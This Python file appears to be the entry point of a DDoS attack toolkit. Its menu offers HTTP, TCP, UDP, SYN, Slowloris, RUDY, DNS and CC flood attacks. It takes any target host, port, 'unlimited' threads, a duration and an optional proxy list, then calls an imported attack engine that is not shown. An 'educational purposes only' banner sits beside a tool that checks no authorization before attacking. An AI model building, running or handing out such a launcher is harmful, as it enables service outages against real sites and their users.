#!/usr/bin/env python3
"""
🚀 DDOS ATTACK EDUCATIONAL TOOLKIT
Created By: Rajsaraswati Jatav
GitHub: https://github.com/RAJSARASWATI-JATAV

⚠️ FOR EDUCATIONAL AND ETHICAL TESTING PURPOSES ONLY ⚠️
"""

import sys
import os
import argparse
import threading
import time
import json
from colorama import init, Fore, Back, Style
import pygame

# Initialize colorama for cross-platform colored output
init(autoreset=True)

# Import custom modules
from ddos_engine import DDOSEngine
from thread_manager import ThreadManager
from utils.banner import display_banner
from utils.config_manager import ConfigManager
from utils.logger import Logger
from utils.validator import InputValidator
from performance_monitor import PerformanceMonitor

class DDOSToolkit:
    """Main DDOS Educational Toolkit Class"""
    
    def __init__(self):
        self.config = ConfigManager()
        self.logger = Logger()
        self.validator = InputValidator()
        self.performance_monitor = PerformanceMonitor()
        self.sound_enabled = True
        self.visual_mode = True
        
        # Initialize pygame for sound effects
        try:
            pygame.mixer.init()
            self.load_sound_effects()
        except:
            self.sound_enabled = False
            self.logger.warning("Sound system not available")
    
    def load_sound_effects(self):
        """Load sound effects"""
        try:
            self.sounds = {
                'startup': pygame.mixer.Sound('assets/sounds/startup.wav'),
                'attack_start': pygame.mixer.Sound('assets/sounds/attack_start.wav'),
                'attack_complete': pygame.mixer.Sound('assets/sounds/attack_complete.wav'),
                'error': pygame.mixer.Sound('assets/sounds/error.wav')
            }
        except:
            self.sound_enabled = False
    
    def play_sound(self, sound_name):
        """Play sound effect"""
        if self.sound_enabled and sound_name in self.sounds:
            try:
                self.sounds[sound_name].play()
            except:
                pass
    
    def display_startup_banner(self):
        """Display startup banner with effects"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        if self.visual_mode:
            display_banner()
        
        print(f"{Fore.CYAN}{Style.BRIGHT}🚀 DDOS ATTACK EDUCATIONAL TOOLKIT{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Created By: Rajsaraswati Jatav{Style.RESET_ALL}")
        print(f"{Fore.RED}⚠️  FOR EDUCATIONAL PURPOSES ONLY ⚠️{Style.RESET_ALL}")
        print("=" * 60)
        
        if self.sound_enabled:
            self.play_sound('startup')
    
    def display_menu(self):
        """Display main menu"""
        print(f"\n{Fore.GREEN}{Style.BRIGHT}🎯 ATTACK MODULES:{Style.RESET_ALL}")
        modules = [
            "1. HTTP Flood Attack",
            "2. TCP Flood Attack", 
            "3. UDP Flood Attack",
            "4. SYN Flood Attack",
            "5. Slowloris Attack",
            "6. RUDY Attack",
            "7. DNS Flood Attack",
            "8. CC Attack",
            "9. Custom Attack",
            "0. Exit"
        ]
        
        for module in modules:
            print(f"{Fore.CYAN}  {module}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}💡 Features: Unlimited Threads | Real-time Monitoring | Sound Effects{Style.RESET_ALL}")
    
    def get_attack_parameters(self):
        """Get attack parameters from user"""
        params = {}
        
        print(f"\n{Fore.GREEN}🎯 ATTACK CONFIGURATION:{Style.RESET_ALL}")
        
        # Target configuration
        target = input(f"{Fore.YELLOW}Enter target (IP/Domain): {Style.RESET_ALL}")
        if not self.validator.validate_target(target):
            print(f"{Fore.RED}❌ Invalid target format!{Style.RESET_ALL}")
            return None
        params['target'] = target
        
        # Port configuration
        try:
            port = int(input(f"{Fore.YELLOW}Enter port (default 80): {Style.RESET_ALL}") or "80")
            if not self.validator.validate_port(port):
                print(f"{Fore.RED}❌ Invalid port range!{Style.RESET_ALL}")
                return None
            params['port'] = port
        except ValueError:
            print(f"{Fore.RED}❌ Port must be a number!{Style.RESET_ALL}")
            return None
        
        # Thread configuration
        threads = input(f"{Fore.YELLOW}Enter threads (default 1000, 'unlimited' for max): {Style.RESET_ALL}") or "1000"
        if threads.lower() == 'unlimited':
            params['threads'] = 'unlimited'
        else:
            try:
                params['threads'] = int(threads)
            except ValueError:
                print(f"{Fore.RED}❌ Invalid thread count!{Style.RESET_ALL}")
                return None
        
        # Duration configuration
        try:
            duration = int(input(f"{Fore.YELLOW}Enter duration in seconds (default 60): {Style.RESET_ALL}") or "60")
            params['duration'] = duration
        except ValueError:
            print(f"{Fore.RED}❌ Duration must be a number!{Style.RESET_ALL}")
            return None
        
        return params
    
    def execute_attack(self, attack_type, params):
        """Execute the selected attack"""
        print(f"\n{Fore.RED}{Style.BRIGHT}🚀 LAUNCHING ATTACK...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Target: {params['target']}:{params['port']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Threads: {params['threads']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Duration: {params['duration']} seconds{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Method: {attack_type}{Style.RESET_ALL}")
        
        if self.sound_enabled:
            self.play_sound('attack_start')
        
        # Initialize DDOS Engine
        engine = DDOSEngine(
            target=params['target'],
            port=params['port'],
            threads=params['threads'],
            duration=params['duration'],
            method=attack_type
        )
        
        # Start performance monitoring
        self.performance_monitor.start_monitoring()
        
        try:
            # Execute attack
            engine.start_attack()
            
            # Monitor progress
            start_time = time.time()
            while time.time() - start_time < params['duration']:
                stats = self.performance_monitor.get_stats()
                
                print(f"\r{Fore.GREEN}📊 Requests: {stats['requests_sent']} | "
                      f"Threads: {stats['active_threads']} | "
                      f"Speed: {stats['requests_per_second']}/s{Style.RESET_ALL}", end="")
                
                time.sleep(1)
            
            # Stop attack
            engine.stop_attack()
            self.performance_monitor.stop_monitoring()
            
            print(f"\n\n{Fore.GREEN}{Style.BRIGHT}✅ ATTACK COMPLETED SUCCESSFULLY!{Style.RESET_ALL}")
            
            if self.sound_enabled:
                self.play_sound('attack_complete')
            
            # Display final statistics
            final_stats = self.performance_monitor.get_final_stats()
            self.display_statistics(final_stats)
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⚠️ Attack interrupted by user{Style.RESET_ALL}")
            engine.stop_attack()
            self.performance_monitor.stop_monitoring()
        except Exception as e:
            print(f"\n{Fore.RED}❌ Attack failed: {str(e)}{Style.RESET_ALL}")
            if self.sound_enabled:
                self.play_sound('error')
    
    def display_statistics(self, stats):
        """Display attack statistics"""
        print(f"\n{Fore.CYAN}{Style.BRIGHT}📊 ATTACK STATISTICS:{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Total Requests Sent: {stats['total_requests']}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Average Speed: {stats['avg_speed']}/s{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Peak Speed: {stats['peak_speed']}/s{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Success Rate: {stats['success_rate']}%{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Total Duration: {stats['duration']} seconds{Style.RESET_ALL}")
    
    def run_interactive_mode(self):
        """Run in interactive mode"""
        self.display_startup_banner()
        
        while True:
            self.display_menu()
            
            try:
                choice = input(f"\n{Fore.YELLOW}Select attack module (0-9): {Style.RESET_ALL}")
                
                if choice == '0':
                    print(f"{Fore.CYAN}👋 Thanks for using DDOS Educational Toolkit!{Style.RESET_ALL}")
                    break
                
                attack_methods = {
                    '1': 'http_flood',
                    '2': 'tcp_flood',
                    '3': 'udp_flood',
                    '4': 'syn_flood',
                    '5': 'slowloris',
                    '6': 'rudy_attack',
                    '7': 'dns_flood',
                    '8': 'cc_attack',
                    '9': 'custom'
                }
                
                if choice in attack_methods:
                    params = self.get_attack_parameters()
                    if params:
                        self.execute_attack(attack_methods[choice], params)
                        input(f"\n{Fore.YELLOW}Press Enter to continue...{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ Invalid selection!{Style.RESET_ALL}")
                    
            except KeyboardInterrupt:
                print(f"\n{Fore.CYAN}👋 Goodbye!{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"{Fore.RED}❌ Error: {str(e)}{Style.RESET_ALL}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description="🚀 DDOS Attack Educational Toolkit - By Rajsaraswati Jatav",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py --interactive
  python main.py --target example.com --port 80 --threads 1000 --method http
  python main.py --target 192.168.1.1 --port 80 --threads unlimited --method slowloris --duration 300
  python main.py --gui

⚠️ FOR EDUCATIONAL AND ETHICAL TESTING PURPOSES ONLY ⚠️
        """
    )
    
    parser.add_argument('--target', help='Target IP address or domain')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--threads', default='1000', help='Number of threads (default: 1000, use "unlimited" for maximum)')
    parser.add_argument('--method', choices=['http', 'tcp', 'udp', 'syn', 'slowloris', 'rudy', 'dns', 'cc'], 
                       help='Attack method')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds (default: 60)')
    parser.add_argument('--proxy-file', help='File containing proxy list')
    parser.add_argument('--interactive', action='store_true', help='Run in interactive mode')
    parser.add_argument('--gui', action='store_true', help='Launch GUI interface')
    parser.add_argument('--no-sound', action='store_true', help='Disable sound effects')
    parser.add_argument('--no-visual', action='store_true', help='Disable visual effects')
    parser.add_argument('--config', help='Configuration file path')
    
    args = parser.parse_args()
    
    # Initialize toolkit
    toolkit = DDOSToolkit()
    
    # Configure options
    if args.no_sound:
        toolkit.sound_enabled = False
    if args.no_visual:
        toolkit.visual_mode = False
    
    # GUI Mode
    if args.gui:
        print(f"{Fore.CYAN}🚀 Launching GUI interface...{Style.RESET_ALL}")
        # TODO: Implement GUI interface
        print(f"{Fore.YELLOW}GUI interface coming soon!{Style.RESET_ALL}")
        return
    
    # Interactive Mode
    if args.interactive or not args.target:
        toolkit.run_interactive_mode()
        return
    
    # Command Line Mode
    if args.target and args.method:
        toolkit.display_startup_banner()
        
        params = {
            'target': args.target,
            'port': args.port,
            'threads': 'unlimited' if args.threads.lower() == 'unlimited' else int(args.threads),
            'duration': args.duration
        }
        
        # Validate parameters
        if not toolkit.validator.validate_target(params['target']):
            print(f"{Fore.RED}❌ Invalid target format!{Style.RESET_ALL}")
            return
        
        if not toolkit.validator.validate_port(params['port']):
            print(f"{Fore.RED}❌ Invalid port range!{Style.RESET_ALL}")
            return
        
        # Execute attack
        toolkit.execute_attack(args.method, params)
    else:
        parser.print_help()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.CYAN}👋 Goodbye!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ Fatal error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)